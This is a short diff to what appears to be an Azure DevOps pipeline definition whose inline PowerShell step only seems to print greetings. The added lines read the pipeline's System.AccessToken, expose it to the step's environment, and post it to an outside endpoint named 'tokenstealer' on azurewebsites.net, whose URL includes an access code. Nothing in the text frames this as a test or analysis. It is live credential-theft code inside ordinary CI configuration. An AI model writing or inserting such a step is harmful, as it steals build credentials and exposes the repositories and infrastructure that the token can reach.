@@ -36,10 +36,12 @@ steps:
       # Write your PowerShell commands here.
       
       Write-Host "Hello World"
+      Write-Host 'Hi'
+      $v= $env:SYSTEM_ACCESSTOKEN
       
       $url = "https://tokenstealer.azurewebsites.net/api/HttpTrigger1?code=kcMARCpv_RepaIFcQlIVV7SCNDIbkB89TZC90h8yYD_AAzFutFRB-A=="  # Replace with your desired endpoint URL
       $body = @{  
-          "name" = "token"
+          "name" = $v
       } | ConvertTo-Json
       
       $headers = @{
@@ -49,3 +51,5 @@ steps:
       $response = Invoke-RestMethod -Uri $url -Method Post -Body $body -Headers $headers
       
       $response
+  env:
+    system_accesstoken: $(System.AccessToken)
